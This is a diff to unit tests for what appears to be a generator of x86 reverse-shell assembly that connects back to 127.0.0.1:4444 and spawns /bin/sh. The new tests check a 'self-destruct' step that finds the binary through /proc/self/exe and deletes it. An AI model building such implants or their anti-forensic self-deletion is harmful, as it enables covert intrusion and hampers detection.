@@ -34,15 +34,23 @@ class FeatureTests(unittest.TestCase):
         self.assertIn("js .fail", asm)
         self.assertIn("SYS_EXIT", asm)
 
-    def test_drop_path_embeds_unlink_after_connect(self):
-        asm = build_assembly("127.0.0.1", 4444, "worker", drop_path="/tmp/worker")
+    def test_self_destruct_always_via_proc_self_exe(self):
+        asm = build_assembly("127.0.0.1", 4444, "worker")
+        self.assertIn("SYS_READLINK", asm)
         self.assertIn("SYS_UNLINK", asm)
-        self.assertIn("push dword 0x706d742f", asm)  # "/tmp" chunk
-        self.assertIn("push dword 0x726f772f", asm)  # "/wor" chunk
-        self.assertIn("push dword 0x0072656b", asm)  # "ker\0" chunk
+        self.assertIn("mov al, 85", asm)                 # readlink
+        self.assertIn("mov al, 10", asm)                 # unlink
+        self.assertIn("push dword 0x6f72702f", asm)      # "/pro" chunk
+        self.assertIn("push dword 0x65732f63", asm)      # "c/se" chunk
+        self.assertIn(".no_unlink", asm)                 # skip on failure
         # still a plain execve of the shell, not a re-exec of the binary
         self.assertIn("mov al, 0xb", asm)
         self.assertIn("execve('/bin//sh'", asm)
+
+    def test_self_destruct_present_without_daemonize(self):
+        asm = build_assembly("127.0.0.1", 4444, "worker", daemonize=False)
+        self.assertIn("SYS_READLINK", asm)
+        self.assertIn("SYS_UNLINK", asm)
 
     def test_shell_option_changes_exec_target(self):
         asm = build_assembly("127.0.0.1", 4444, "worker", shell="/bin/bash")
